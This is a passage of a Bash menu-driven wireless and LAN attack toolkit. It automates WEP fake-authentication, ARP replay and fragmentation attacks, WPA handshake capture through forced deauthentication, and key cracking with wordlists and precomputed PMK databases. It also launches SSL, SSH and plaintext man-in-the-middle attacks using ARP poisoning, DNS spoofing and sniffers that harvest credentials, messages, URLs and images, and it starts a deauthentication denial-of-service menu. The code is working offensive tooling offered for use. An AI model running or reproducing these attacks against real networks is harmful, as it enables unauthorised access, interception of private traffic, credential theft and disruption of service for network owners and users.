			$(cat ./config/scan.cfg) airodump-ng -w ./output/attackdata/wepfakeauth/$TESSID/$TESSID --ivs --band g --channel $TCH --showack --berlin 2 --encrypt $TENC --bssid $TBSSID $INT &
			echo
			echo "Initalizing Fake Authentication..."
			sleep 1
			$(cat ./config/fakeauth.cfg) aireplay-ng -1 15 -e $TESSID -a $TBSSID -h 00:11:22:33:44:55 $INT &
			sleep 10
			echo
			echo "Initalizing ARP Packet Capture and Re-Injection..."
			sleep 1
			$(cat ./config/arpinject.cfg) aireplay-ng -3 -e $TESSID -b $TBSSID -h 00:11:22:33:44:55 $INT &
					crack
		elif [ "$Q" = "n" ]; then
			echo
			echo "Please Set a New Target!"
			echo
			echo "Returning to Main Menu..."
					Main-Menu
		else
			echo
			echo "Invalid Selection!"
		fi
	else
		echo "No Target Set!"
		echo "Please Set a Target!"
		echo
		echo "Returning to Main Menu..."
	fi
}

					# End FakeAuth Initalizer Function --->

					# <---Start Fake Authentication & Encryption Crack Function

function crack {
	echo
	echo "Would you like to start Cracking?"
	echo "[y/n]"
	read Q
	if [ "$Q" = "n" ]; then
		echo
		echo "Returning to Main Menu..."
		sleep 2
				Main-Menu
	elif [ "$Q" = "y" ]; then
		echo
		echo "Initalizing Encryption Cracking..."
		sleep 1
		$(cat ./config/wepcrack.cfg) aircrack-ng -f 2 -a 1 -b $TBSSID ./output/attackdata/wepfakeauth/$TESSID/$TESSID*.ivs &
		echo
		echo "Crack Attempt Running..."
		sleep 2
				entercode
	else
		echo
		echo "Invalid Selection!"
	fi
}

					# End Fake Authentication & Encryption Cracking Function--->

					# <---Start Fragmentation Attack  Function

function Fragmentation {
clear
cat ./headers/fragmentationheader
cat ./headers/line1
	if [ "$TBSSID" != "$(cat /dev/null)" ]; then
		echo
		echo "Current Target"
		echo
		echo "ESSID:----$TESSID"
		echo "BSSID:----$TBSSID"
		echo "Cipher:---$TENC"
		echo "Channel:--$TCH"
		echo
		echo "Would you like to attack this Target?"
		echo "[y/n]"
		read Q
		if [ "$Q" = "y" ]; then
			echo
			echo "If you would like to enter a specific IP for ARP Request"
			echo "Please Enter it here."
			read Q
			if [ "$Q" = "$(cat /dev/null)" ]; then
				echo
				echo "Using Internal Program Default..."
				sleep 1
				echo "Initalizing Attack..."
				sleep 1
				$(cat ./config/fragattack.cfg) wesside-ng -v $TBSSID -i $INT &
				echo
				echo "Initalization Complete!"
				echo
				echo "Returning to Main Menu..."
				sleep 3
						Main-Menu
			elif [ "$Q" = "$Q" ]; then
				echo
				echo "Target for ARP request is: $Q"
				sleep 2
				echo
				echo "Initalizing Attack..."
				sleep 1
				$(cat ./config/fragattack.cfg) wesside-ng -v $TBSSID -n $Q -i $INT &
				echo
				echo "Initalization Complete!"
				echo
				echo "Returning to Main Menu..."
				sleep 3
						Main-Menu
			fi
		elif [ "$Q" = "n" ]; then
			echo
			echo "Please set a New Target!"
			echo
			echo "Returning to Main Menu..."
			sleep 2
					Main-Menu
		else
			echo "Invalid Selection!"
		fi
	else
		echo
		echo "No Target Set!"
		echo "Please Set a Target!"
		echo
		echo "Returning to Main Menu..."
		sleep 2
				Main-Menu
	fi
}

					# End Fragmentation Attack Function --->

					# <---Start Attacks Sub-Menu, WPA Attacks Function

function WPA {
clear
cat ./headers/wpaattackmenuheader
cat ./headers/line1
echo
 OPTIONS="Attack PMK-Menu Crack Main-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "$opt" ]; then
				$opt
		else
			echo "Invalid Selection!"
		fi
	done
}

					# End Attacks Sub-Menu, WPA Attacks Function --->

					# <---Start WPA Attack (Obtain 4-Way Handshake)

function Attack {
clear
cat ./headers/wpaattackheader
cat ./headers/line1
	if [ "$TBSSID" != "$(cat /dev/null)" ]; then
		echo
		echo "Current Target"
		echo
		echo "ESSID:-----$TESSID"
		echo "BSSID:-----$TBSSID"
		echo "Cipher:----$TENC"
		echo "Channel:---$TCH"
		echo "Victim:----$VICBSSID"
		echo
		echo "Would you like to attack this Target?"
		echo "[y/n]"
		read Q
		if [ "$Q" = "n" ]; then
			echo
			echo "Please set a New Target!"
			echo 
			echo "Returning to Main Menu..."
			sleep 2
					Main-Menu
		elif [ "$Q" = "y" ]; then
			echo
			if [ -e "./output/attackdata/wpaattack/$TESSID" ]; then
				echo "NULL" > /dev/null
			else
				mkdir ./output/attackdata/wpaattack/$TESSID
			fi
			echo "Initalizing Attack Against WPA Encrypted Access Point: $TESSID..."
			echo
			echo "Initalizing Handshake Capture..."
			sleep 1
			$(cat ./config/wpacapture.cfg) airodump-ng -w ./output/attackdata/wpaattack/$TESSID/$TESSID.cap --band bg --channel $TCH --showack --encrypt WPA --bssid $TBSSID $INT &
			echo
			echo "Initalizing De-Authentication Frame Transmission..."
			sleep 1
					wpadeauth			
		else
			echo
			echo "Invalid Selection!"
			clear
				Attack
		fi
	else
		echo "No Target Currently Set!"
		echo "Please Set a WPA Encrypted Target!"
		echo
		echo "Returning to Main Menu..."
		sleep 2
				Main-Menu
	fi
}

					# End WPA Attack (Obtain 4-Way HandShake) --->

					# <---Start WPA DeAuthentication Function

function wpadeauth {
	if [ "$FRAMES" = "$(cat /dev/null)" ]; then
		FRAMES=5
		echo
		$(cat ./config/deauthwpa.cfg) aireplay-ng -0 $FRAMES -a $TBSSID -c $VICBSSID $INT &
		echo
		echo "Would you like to Initalize DeAuthentication Frame Transmission Again?"
		echo "[y/n]"
		read Q
		if [ "$Q" = "n" ]; then
			echo
			echo "Returning to Main Menu..."
			sleep 2
				Main-Menu
		elif [ "$Q" = "y" ]; then
			echo
			echo "How many DeAuth Frames would you like to transmit?"
			echo "[Default: 5]"
			read FRAMES
			if [ "$FRAMES" = "$(cat /dev/null)" ]; then
				echo "Using Default..."
				export FRAMES=5
			else
				echo "NULL" > /dev/null
			fi
			echo
			echo "Sending $FRAMES DeAuth Frames!"
				wpadeauth
		else
			echo
			echo "Invalid Selection!"
			echo "Try Again!"
		fi
	else
		$(cat ./config/deauthwpa.cfg) aireplay-ng -0 $FRAMES -a $TBSSID -c $VICBSSID $INT &
		echo
		echo "Returning to Main Menu..."
		sleep 2
			Main-Menu
	fi
}

					# End WPA DeAuthentication Function --->

					# <---Start WPA PMK Menu Function

function PMK-Menu {
clear
cat ./headers/prehashheader
cat ./headers/line1
	echo
	echo "How would you like to Manipulate the Database?"
	echo
 OPTIONS="ListDB Import-Passwds Import-ESSID Clean Verify Process Stats Main-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "Main-Menu" ]; then
			echo
			echo "Returning to Main Menu..."
			sleep 2
				Main-Menu
		elif [ "$opt" = "ListDB" ]; then
				listdatabase
		elif [ "$opt" = "$opt" ]; then
				export PMKPARENT=$opt
				selectdatabase
		else
			echo "Invalid Selection!"
			sleep 1
				PMK-Menu
		fi
	done
}

					# End WPA PMK Menu Function --->

					# <---Start List Database Function

function listdatabase {
clear
cat ./headers/prehashheader
cat ./headers/line1
	echo
	echo "--> Searching for Databases..."
	sleep 3
	COUNT=$(( $(ls -l ./pmkdb |wc -l) - 1 ))
	if [ "$COUNT" = "0" ]; then
		echo
		echo "--> You have no PMK Databases!"
		echo "--> Please Create one!"
		echo
		echo "Returning to PMK-Menu..."
		sleep 3
			PMK-Menu
	else
		echo
		echo "--> Found $COUNT Databases!"
		if [ -e ./tmp/activedatabase ]; then
			echo "NULL" > /dev/null
		else
			> ./tmp/activedatabase
		fi
		if [ "$(cat ./tmp/activedatabase)" = "$(cat /dev/null)" ]; then
			echo "--> No Database Currently Active!"
			echo
			echo "Would you like to set an Active Database?"
			echo "[y/n]"
			read Q
			if [ "$Q" = "n" ]; then
				echo
				echo "--> Listing Databases..."
				echo
				sleep 1
				echo "$(ls -l ./pmkdb)"
				echo
				echo "Press Enter to Return to PMK-Menu..."
				read ENTER
				echo "--> Returning to PMK-Menu..."
				sleep 1
					PMK-Menu
			elif [ "$Q" = "y" ]; then
				echo
				echo "Which Database would you like to set as active?"
				 OPTIONS="$(ls ./pmkdb) PMK-Menu"
					select opt in $OPTIONS; do
						if [ "$opt" = "PMK-Menu" ]; then
							echo
							echo "--> Returning to PMK-Menu..."
							sleep 2
								PMK-Menu
						elif [ "$opt" = "$opt" ]; then
							echo
							echo "--> Setting $opt as Active Database..."
							sleep 1
							echo "$opt" > ./tmp/activedatabase
							echo "--> $(cat ./tmp/activedatabase) is now set as active!"
							echo "--> Returning to PMK-Menu..."
							sleep 4
								PMK-Menu
						else
							echo "Invalid Selection!"
							echo "Try Again!"
						fi
					done
			else
				echo
				echo "Invalid Selection!"
			fi
		else
			echo
			echo "--> $(cat ./tmp/activedatabase) is currently set as Active!"
			echo "--> Listing Databases..."
			sleep 1
			echo
			echo "$(ls -l ./pmkdb)"
			echo
			echo "Press Enter to Return to PMK-Menu."
			read ENTER
			echo "--> Returning to PMK-Menu..."
			sleep 3
				PMK-Menu
		fi
	fi
}

					# End List Database Function --->

					# <---Start Database Selection Function
function selectdatabase {
clear
cat ./headers/prehashheader
cat ./headers/line1
	echo
	echo "Please Select a Database to work with!"
	 OPTIONS="$(ls ./pmkdb) Create PMK-Menu"
		select opt in $OPTIONS; do
			if [ "$opt" = "PMK-Menu" ]; then
				echo
				echo "--> Returning to PMK-Menu..."
				sleep 2
					PMK-Menu
			elif [ "$opt" = "Create" ]; then
				echo 
				echo "---> Please Enter new Database Name to be Created."
				read DBNAME
				echo
				echo "---> Database to be Created $DBNAME"
				echo "---> Setting..."
				sleep 1
				echo "$DBNAME" > ./tmp/activedatabase
				echo "---> Database $(cat ./tmp/activedatabase) set for Creation!"
				PARENT=$(cat ./tmp/pmkparent)
					$PARENT
			elif [ "$opt" = "$opt" ]; then
				echo "$opt" > ./tmp/activedatabase
				echo
				echo "--> Database $(cat ./tmp/activedatabase) Selected!"
				PARENT=$(cat ./tmp/pmkparent)
					$PARENT
			else
				echo "Invalid Selection!"
				sleep 1
					selectdatabase
			fi
		done
}

					# End Database Selection Function --->

					# <---Start Import Passwords Function

function Import-Passwds {
clear
cat ./headers/prehashheader
cat ./headers/line1
	echo
	echo "File to Import?"
	read FILENAME
	echo
	echo "--> Importing Passwords..."
	sleep 1
	airolib-ng ./pmkdb/$(cat ./tmp/activedatabase) --import passwd "$FILENAME"
	echo
	echo "--> Import Complete!"
	echo "--> Returning to PMK-Menu..."
	sleep 5
		PMK-Menu
}

					# End Import Passwords Function --->

					# <---Start Import ESSID Function

function Import-ESSID {
clear
cat ./headers/prehashheader
cat ./headers/line1
	echo 
	echo "Would you like to Import a Single ESSID or a List?"
	echo "[(s)ingle/(l)ist]"
	read TYPE
	echo
	if [ "$TYPE" = "s" ]; then
		echo "Please Enter new ESSID!"
		read ESSID
		echo
		echo "--> Initalizing Import..."
		echo
		echo "$ESSID" > ./tmp/newessid
		airolib-ng ./pmkdb/$(cat ./tmp/activedatabase) --import essid ./tmp/newessid
		echo
		echo "--> Import Complete!"
		echo "--> Returning to PMK-Menu..."
		sleep 2
			PMK-Menu
	elif [ "$TYPE" = "l" ]; then
		echo "Please Enter ESSID List Filename!"
		read ESSID
		echo
		echo "--> Initalizing Import of ESSID List..."
		sleep 1
		echo
		airolib-ng ./pmkdb/$(cat ./tmp/activedatabase) --import essid $ESSID
		echo
		echo "--> Import Complete!"
		echo "--> Returning to PMK-Menu..."
		sleep 2
			PMK-Menu
	else
		echo "Invalid Selection!"
			Import-ESSID
	fi
}

					# End Import ESSID Function --->

					# <---Start Database Cleaning Function

function Clean {
clear
cat ./headers/prehashheader
cat ./headers/line1
	echo
	echo "--> Initalizing Database Cleaning..."
	echo "--> $(cat ./tmp/activedatabase) Selected!"
	echo
	airolib-ng ./pmkdb/$(cat ./tmp/activedatabase) --clean all
	echo
	echo "--> Database Cleaning Complete!"
	echo "--> Returning to PMK-Menu..."
	sleep 2
		PMK-Menu
}

					# End Database Cleaning Function --->

					# <---Start Database PMK Verification Function

function Verify {
clear
cat ./headers/prehashheader
cat ./headers/line1
	echo
	echo "Which Verification Type would you like?"
	 OPTIONS="Random Full PMK-Menu"
		select opt in $OPTIONS; do
		if [ "$opt" = "PMK-Menu" ]; then
			echo
			echo "--> Returning to PMK-Menu..."
			sleep 2
				PMK-Menu
		elif [ "$opt" = "Random" ]; then
			echo
			echo "--> Initalizing Random PMk Verification..."
			echo "--> $(cat ./tmp/activedatabase) Selected!"
			echo
			airolib-ng ./pmkdb/$(cat ./tmp/activedatabase) --verify
			echo
			echo "--> Random Verification Complete!"
			echo "--> Press Enter to Return to PMK-Menu..."
			read ENTER
			echo "--> Returning to PMK-Menu..."
			sleep 2
				PMK-Menu
		elif [ "$opt" = "Full" ]; then
			echo
			echo "--> Initalizing Full PMK Verification..."
			echo "--> $(cat ./tmp/activedatabase) Selected!"
			echo
			airolib-ng ./pmkdb/$(cat ./tmp/activedatabase) --verify all
			echo
			echo "--> Full Verification Complete!"
			echo "--> Press Enter to Return to PMK-Menu!"
			read ENTER
			echo "--> Returning to PMK-Menu..."
			sleep 2
				PMK-Menu
		else
			echo
			echo "Invalid Selection!"
		fi
	done
}

					# End Database PMK Verification Function --->

					# <---Start Database Processing Function

function Process {
clear
cat ./headers/prehashheader
cat ./headers/line1
	echo
	echo "--> Initalizing Batch Processing of $(cat ./tmp/activedatabase) Database..."
	echo "--> This May take Awhile!"
	echo
	airolib-ng ./pmkdb/$(cat ./tmp/activedatabase) --batch
	echo
	echo "--> Batch Processing Complete!"
	echo "--> Press Enter to Return to PMK-Menu."
	read ENTER
	echo "--> Returning to PMK-Menu..."
	sleep 2
		PMK-Menu
}
					# End Database Processing Function --->

					# <---Start Database Statistics Function

function Stats {
clear
cat ./headers/prehashheader
cat ./headers/line1
	echo
	echo "--> Retreiving Database Statistics..."
	airolib-ng ./pmkdb/$(cat ./tmp/activedatabase) --stats > ./tmp/databasestats
	echo "--> Done!"
	echo
	echo "How would you like to Display the Statistics?"
	echo "[(s)hort/(f)ull]"
	read DISPLAY
	if [ "$DISPLAY" = "s" ]; then
		echo
		echo "--> Displaying Short Stats..."
		echo
		cat ./tmp/databasestats |grep 'database'
		echo
		echo "Press Enter to Return to PMK-Menu."
		read ENTER
		echo "--> Returning to PMK-Menu..."
		sleep 2
			PMK-Menu
	elif [ "$DISPLAY" = "f" ]; then
		echo
		echo "--> Displaying Full Stats..."
		echo
		less ./tmp/databasestats
		echo 
		echo "Press Enter to Return to PMK Menu."
		read ENTER
		echo "--> Returning to PMK-Menu..."
		sleep 2
			PMK-Menu
	else
		echo
		echo "Invalid Selection!"
		sleep 2
			Stats
	fi
}

					# End Database Statistics Function --->

					# <---Start WPA HandShake Cracking Function

function Crack {
clear
cat ./headers/crackheader
cat ./headers/line1
	echo
	echo "Would you like to use a Wordlist or a Rainbow Table?"
	echo "[(w)ordlist/(r)ainbowtable]"
	read DICT
	echo
	if [ "$TESSID" = "$(cat /dev/null)" ]; then
		echo "---> There is currently to target set!"
		echo "---> Would you like to enter a ESSID to search for?"
		echo "---> [y/n]"
		read Q
		if [ "$Q" = "y" ]; then
			echo
			echo "---> Please enter the ESSID..."
			read ESSID
			export FOLDER=$ESSID
			echo
				CMENU
		elif [ "$Q" = "n" ]; then
			echo
			echo "---> Please set a target!"
			echo "---> Returning to Main Menu..."
			sleep 2
				Main-Menu
		else
			echo
			echo "Invalid Selection!"
			sleep 1
				Crack
		fi
	else
		echo
		echo "---> Your current target is $TESSID"
		echo "---> Is this correct?"
		echo "---> [y/n]"
		read Q
		if [ "$Q" = "y" ]; then
			FOLDER=$TESSID
				CMENU
		elif [ "$Q" = "n" ]; then
			echo
			echo "---> Would you like to enter an ESSID to search for?"
			read Q
			if [ "$Q" = "y" ]; then
				echo
				echo "---> Please enter an ESSID..."
				read ESSID
			elif [ "$Q" = "n" ]; then
				echo 
				echo "---> Please set a target!"
				echo "---> Returning to Main Menu..."
				sleep 2
					Main-Menu
			else
				echo
				echo "Invalid Selection!"
				sleep 1
					Crack
			fi
		else
			echo
			echo "---> Invalid Selection!"
			sleep 1
				Crack
		fi
	fi
}

					# End WPA Handshake Cracking Function --->

					# <---Start WPA Handshake Cracking Menu Sub-Function

function CMENU {
echo "Which WPA Handshake would you like to attempt to crack?"
cd ./output/attackdata/wpaattack/$FOLDER/
 OPTIONS="$(ls *.cap) Specify Previous-Menu"
cd /root/attackvector/
	select opt in $OPTIONS; do
		if [ "$opt" = "Specify" ]; then
			Specify
		elif [ "$opt" = "Previous-Menu" ]; then
			echo
			echo "---> Returning to Attacks Menu..."
			sleep 2
				Attacks
		elif [ "$opt" = "$opt" ]; then
			echo
			echo "---> Target WPA Handshake Set!"
			TARGETHS=$opt
			echo "---> [./output/attackdata/wpaattack/$FOLDER/$TARGETHS]"
			if [ "$DICT" = "r" ]; then
				rainbowtables
			elif [ "$DICT" = "w" ]; then
				wordlist
			else
				echo "Error in DICT Variable!"
			fi
		else
			echo "---> Invalid Selection!"
				CMENU
		fi
	done
}

					# End WPA Handshake Cracking Menu Sub-Function -->

					# <--Start Cracking using Rainbow Tables

function rainbowtables {
clear
cat ./headers/rainbowtableheader
cat ./headers/line1
	echo
	echo "Which Rainbow Table would you like to use?"
	 OPTIONS="$(ls ./pmkdb) Attacks Main-Menu"
		select opt in $OPTIONS; do
			if [ "$opt" = "Attacks" ]; then
				echo 
				echo "---> Returning to Attacks Menu..."
				sleep 2
					Attacks
			elif [ "$opt" = "Main-Menu" ]; then
				echo
				echo "---> Returning to Main Menu..."
				sleep 2
					Main-Menu
			elif [ "$opt" = "$opt" ]; then
				echo
				echo "---> Ready to Initalize Cracking!"
				echo "     -=-=-=-=-=-=-=-=-=-=-=-=-=-="
				echo "---> Handshake: $TARGETHS"
				echo "---> RainbowTable: $opt" 
				echo
				echo "---> Starting Crack..."
				$(cat ./config/wpacrack.cfg) aircrack-ng -r ./pmkdb/$opt ./output/attackdata/wpaattack/$FOLDER/$TARGETHS
				echo "---> Crack Attempt Running..."
				sleep 2
					entercode
			else
				echo
				echo "Invalid Selection!"
				sleep 1
					rainbowtables
			fi
		done
}

					# End Cracking Using Rainbow Tables --->

					# <--- Start Cracking Using Wordlist

function wordlist {
clear
cat ./headers/wordlistcrackheader
cat ./headers/line1
	echo
	echo "Please Enter to Location and Filename of Wordlist."
	read WORDLIST
	echo
	echo "---> Searching for Wordlist..."
	sleep 1
	if [ -e $WORDLIST ]; then
		echo "---> Wordlist Found!"
		echo "---> Counting..."
		sleep 1
		WORDS=$(cat $WORDLIST |wc -l)
		echo "---> Wordlist Contains $WORDS Words!"
		echo "---> Setting List at Active..."
		sleep 1
		export ACTIVEWORDLIST=$WORDLIST
		echo "---> Set!"
		echo
		echo "---> Target HandShake set as $FOLDER/$TARGETHS"
		echo 
		echo "---> Press Enter to Start Cracking!"
		read ENTER
		if [ "$ENTER" = "$(cat /dev/null)" ]; then
			echo
			echo "---> Starting Crack Attempt..."
			$(cat ./config/wpacrack.cfg) aircrack-ng -w $WORDLIST ./output/attackdata/wpaattack/$FOLDER/$TARGETHS &
			echo "---> Crack Attempt Running..."
			sleep 1
				entercode
		else
			echo
			echo "Invalid Selection!"
		fi
	else
		echo "---> Wordlist NOT Found!"
		echo "---> You Entered Location: $WORDLIST"
		echo "---> Please Re-Enter!"
		sleep 5
			wordlist
	fi
}

					# End Cracking with Wordlist Function --->

					# <---Start Local Area Network Attacks Menu Function

function LAN {
clear
cat ./headers/lanmenuheader
cat ./headers/line1
	echo 
	echo "Please Select an Attack!"
 OPTIONS="SSLM SSHM PTM Just-Capture Attacks Main-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "Attacks" ]; then
			echo
			echo "---> Returning to Attacks Menu..."
			sleep 1
				Attacks
		elif [ "$opt" = "Main-Menu" ]; then
			echo
			echo "---> Returning to Main Menu..."
			sleep 1
				Main-Menu
		elif [ "$opt" = "$opt" ]; then
			$opt
		else
			echo "Invalid Selection!"
			sleep 1
				LAN
		fi
	done
}

					# End Local Area Network Attacks Menu Function --->

					# <---Start Secure Socket Layer Man-in-the-Middle Attack Function

function SSLM {
clear
cat ./headers/sslmitmheader
cat ./headers/line1
	echo
	echo "---> Please enter Network Nickname <---"
	read NICKNAME
	if [ "$NICKNAME" = "$(cat /dev/null)" ]; then
		echo
		echo "PLEASE ENTER NICKNAME!"
		sleep 2
			SSLM
	elif [ "$NICKNAME" = "$NICKNAME" ]; then
		if [ -e /tmp/$NICKNAME.cap ]; then
			echo
			echo "---> Checking..."
			sleep 2
			echo "---> Filename $NICKNAME.cap Already exists."
			echo "---> OverWrite?"
			echo "---> [Y/N]"
			read Q
			if [ "$Q" = "y" ]; then
				echo
				echo "---> Overwriting!..."
				sleep 1
				rm -f /tmp/$NICKNAME.cap 3> /dev/null
			elif [ "$Q" = "n" ]; then
				echo
				echo "---> Please Choose another name!"
				sleep 2
					SSLM
			else
				echo
				echo "---> Invalid Selection!"
				sleep 1
					SSLM
			fi
		else
			echo
			echo "---> Checking..."
			sleep 2
			echo "---> OK!"
		fi
	echo "---> Please enter attack interface. <---"
	read INT
	echo
	echo "---> Please Enter Gateway Address. <---"
	read GWADDY
	echo
	echo "---> Setup Complete! <---"
	echo
	echo "---> Initalizing SSL MITM Attack..."
	sleep 1
	echo "---> Initalizing Data Repeater..."
	konsole --vt_sz 88x15 --caption "Redirecting Traffic" -e fragrouter -i $INT -B1&
	sleep 2
	echo "---> Initalizing Domain Redirection..."
	konsole --vt_sz 80x06 --caption "Redirecting Connections" -e dnsspoof -i $INT &
	sleep 2
	echo "---> Initalizing 3rd Party..."
	konsole --vt_sz 80x05 --workdir ./certificates --caption "THE MAN" -e webmitm -d &
	sleep 2
	echo "---> Initalizing ARP Poisoning..."
	konsole --vt_sz 88x10 --caption "Poisoning ARP Tables " -e arpspoof -i $INT $GWADDY &
	sleep 2
	echo "---> Initalizing Packet Capture..."
	konsole --noclose -vt_sz 88x10 --caption "Dumping Captured Data" -e dumpcap -i $INT -f "port 443" -w /tmp/$NICKNAME.cap &
	sleep 2
	echo "---> Initalizing Plain-Text Capture..."
	konsole --vt_sz 89x14 --caption "Got my nose to the ground" -e dsniff -i $INT -c -m -w ./output/attackdata/lan/ptm/$NICKNAME-$GWADDY.dsniffouput &
	sleep 2
	echo "---> SSL MITM Initalizing Complete!"
	echo 
	echo "---> Returning to Main Menu..."
	sleep 3
		Main-Menu
	fi
}

					# End Secure Socket Layer Man-in-the-Middle Attack Function--->

					# <---Start Secure Shell Host Man-in-the-Middle Attack

function SSHM {
clear
cat ./headers/sshheader
cat ./headers/line1
        echo
        echo "---> Please enter Network Nickname <---"
        read NICKNAME
        if [ "$NICKNAME" = "$(cat /dev/null)" ]; then
                echo
                echo "PLEASE ENTER NICKNAME!"
                sleep 2
                        SSHM
        elif [ "$NICKNAME" = "$NICKNAME" ]; then
                if [ -e /tmp/$NICKNAME.cap ]; then
                        echo
                        echo "---> Checking..."
			sleep 2
                        echo "---> Filename $NICKNAME.cap Already exists."
                        echo "---> Please Choose antoher name!"
                        sleep 2
                                SSLM
                else
                        echo
                        echo "---> Checking..."
			sleep 2
                        echo "---> OK!"
                fi
	echo "---> Please Enter Attack Interface."
	read INT
	echo
	echo "---> Please Enter Gateway Address."
	read GWADDY
	echo
	echo "---> Initalizing SSH MITM Attack..."
	echo 
	echo "---> Initalizing SSH Redirection..."
        konsole --vt_sz 80x06 --caption "Redirecting Connections" -e dnsspoof -i $INT dst port 22 &
	sleep 1
	echo "---> Initalizing Remaining Data Redirection..."
        konsole --vt_sz 88x15 --caption "Redirecting Traffic" -e fragrouter -B1 &
	sleep 1
	echo "---> Initalizing THE MAN...."
	konsole --noclose --vt_sz 80x05 --caption "THE MAN" -e sshmitm -d -p 22 $GWADDY 22 &
	sleep 1
	echo "---> Initializing Packet Capture..."
        konsole --noclose --vt_sz 80x08 --caption "Dumping Captured Data" -e dumpcap -i $INT -f "port 22" -w /tmp/$NICKNAME.cap &
	sleep 1
	echo "---> Initalizing ARP Poisoning..."
        konsole --noclose --vt_sz 88x10 --caption "Poisoning ARP Tables " -e arpspoof -i $INT $GWADDY &
	sleep 1
	echo "---> SSH MITM Attack Initialized!"
	echo
	echo "---> Returning to Main Menu..."
	sleep 3
		Main-Menu
	fi
}

					# End Secure Shell Host Man-in-the-Middle Attack--->

					# <---Start Plain Text Man-in-the-Middle Attack

function PTM {
clear
cat ./headers/ptmheader
cat ./headers/line1
        echo
        echo "---> Please enter Network Nickname <---"
        read NICKNAME
        if [ "$NICKNAME" = "$(cat /dev/null)" ]; then
                echo
                echo "PLEASE ENTER NICKNAME!"
                sleep 2
                        PTM
        elif [ "$NICKNAME" = "$NICKNAME" ]; then
                if [ -e /tmp/$NICKNAME*.cap ]; then
                        echo
                        echo "---> Checking..."
                        sleep 1
                        echo "---> Filename $NICKNAME.cap Already exists."
			echo "---> File will NOT be Overwritten!"
                        echo "---> Please Choose antoher name!"
                        sleep 2
                               	PTM
                else
                        echo
                        echo "---> Checking..."
                        sleep 1
                        echo "---> OK!"
                fi
		echo "---> Please Enter Attack Interface."
		read INT
		echo 
		echo "---> Please Enter Gateway Address."
		read GWADDY
		echo
		echo "---> Initalizing General Scan..."
	        konsole --noclose --vt_sz 89x14 --caption "Got my nose to the ground" -e dsniff -i $INT -c -m -w ./output/attackdata/lan/ptm/$GWADDY-$NICKNAME.dsniff.output &
		sleep 1
		echo "---> Initalizing MSG Scan..."
	        konsole --noclose --vt_sz 88x15 --caption "Redirecting Traffic" -e msgsnarf -i $INT > ./output/attackdata/lan/ptm/$GWADDY-$NICKNAME.msgsnarf.output &
		sleep 1
		echo "---> Initalizing Universal Resource Locator Scan..."
	        konsole --noclose --vt_sz 88x15 --caption "Redirecting Traffic" -e urlsnarf -i $INT > ./output/attackdata/lan/ptm/$GWADDY-$NICKNAME.urlsnarf.output &
		sleep 1
		echo "---> Initalizing A/V Capture..."
		if [ -e ./output/attackdata/lan/ptm/$GWADDY-$NICKNAME ]; then
			echo "NULL" > /dev/null
		else
			mkdir ./output/attackdata/lan/ptm/$GWADDY-$NICKNAME
		fi
	        konsole --noclose --vt_sz 88x15 --caption "Grabbing A/V" -e driftnet -i $INT -a -m 100000 -d ./output/attackdata/lan/ptm/$GWADDY-$NICKNAME &
		sleep 1
		echo "---> Initalizing Data NET..."
		konsole --noclose --vt_sz 80x05 --caption "NET OPEN" -e dumpcap -i $INT -f "not broadcast and not multicast" -w /tmp/$NICKNAME-$GWADDY.cap &
		sleep 1
		echo "---> Initalizing Data Redirection..."
	        konsole --noclose --vt_sz 88x15 --caption "Redirecting Traffic" -e fragrouter -B1 &
		sleep 1
		echo "---> Initializing ARP Poisoning..."
	        konsole --noclose --vt_sz 88x10 --caption "Poisoning ARP Tables " -e arpspoof -i $INT $GWADDY &
		echo
		echo "---> PT MITM Attack Initalized!"
		echo
		echo "---> Returning to Main Menu..."
		sleep 3
			Main-Menu
	fi
}

					# End Plain Text Man-in-the-Middle Attack Function --->

					# <---Start All Around MITM Attack Data Capture Function

function Just-Capture {
clear
cat ./headers/justcaptureheader
cat ./headers/line1
        echo
        echo "---> Please enter Network Nickname <---"
        read NICKNAME
        if [ "$NICKNAME" = "$(cat /dev/null)" ]; then
                echo
                echo "PLEASE ENTER NICKNAME!"
                sleep 2
                        Just-Capture
        elif [ "$NICKNAME" = "$NICKNAME" ]; then
                if [ -e /tmp/$NICKNAME*JC.cap ]; then
                        echo
                        echo "---> Checking..."
                        sleep 1
                        echo "---> Filename $NICKNAME Already exists."
                        echo "---> Please Choose antoher name!"
                        sleep 2
                                Just-Capture
                else
                        echo
                        echo "---> Checking..."
                        sleep 1
                        echo "---> OK!"
                fi
		echo "---> Please Enter Attack Interface."
		read INT
		echo
		echo "---> Please Enter Gateway Address."
		read GWADDY
		echo
		echo "---> Initalizing Data Redirection..."
                konsole --vt_sz 88x15 --caption "Redirecting Traffic" -e fragrouter -B1 &
		sleep 1
		echo "---> Initalizing Data NET..."
                konsole --vt_sz 80x05 --caption "NET OPEN" -e dumpcap -i $INT -f "not broadcast and not multicast" -w /tmp/$NICKNAME-$GWADDY-JC.cap &
		sleep 1
		echo "---> Initalizing ARP Poisoning..."
                konsole --vt_sz 88x10 --caption "Poisoning ARP Tables " -e arpspoof -i $INT $GWADDY &
		sleep 1
		echo "---> MITM Data Capture Running!"
		echo 
		echo "---> Returning to Main Menu..."
		sleep 3
			Main-Menu
	fi
}

					# End All Around MITM Attack Data Capture Function--->

					# <---Start Denial of Service Attacks Menu Function

function DoS {
clear
cat ./headers/DoSattackheader
cat ./headers/line1
	echo
	echo "What DoS Attack would you like to Perform?"
 OPTIONS="AP-DeAuth CL-DeAuth Attacks Main-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "Attacks" ]; then
			echo
			echo "---> Returning to Attacks Menu..."
			sleep 1
				Attacks
		elif [ "$opt" = "Main-Menu" ]; then
			echo
			echo "---> Returning to Main Menu..."
			sleep 1
				Main-Menu
		elif [ "$opt" = "$opt" ]; then
			$opt
		else
			echo "Invlaid Selection!"
			sleep 1
				DoS
		fi
	done
}

					# End Denial of Service Attack Menu Function--->

					# <---Start Access Point Mass De-Authentication Function

function AP-DeAuth {
clear
cat ./headers/apdeauthheader
cat ./headers/line1
	if [ "$TBSSID" = "$(cat /dev/null)" ]; then
		echo
		echo "---> No target currently selected!"
		echo "---> Please select your target first!"
		echo "---> Returning to Main Menu..."
		sleep 2
			Main-Menu
	else
		echo
		echo "  ---> Current Target <---"
		echo "ESSID: $TESSID"
		echo "BSSID: $TBSSID"
		echo "Channel: $TCH"
		echo
		echo "---> Would you like to use this Target?"
		read Q
	fi
	if [ "$Q" = "n" ]; then
		echo
		echo "---> Please Set a New Target!"
		sleep 1
		echo "---> Returning to Main Menu..."
		sleep 3
			Main-Menu
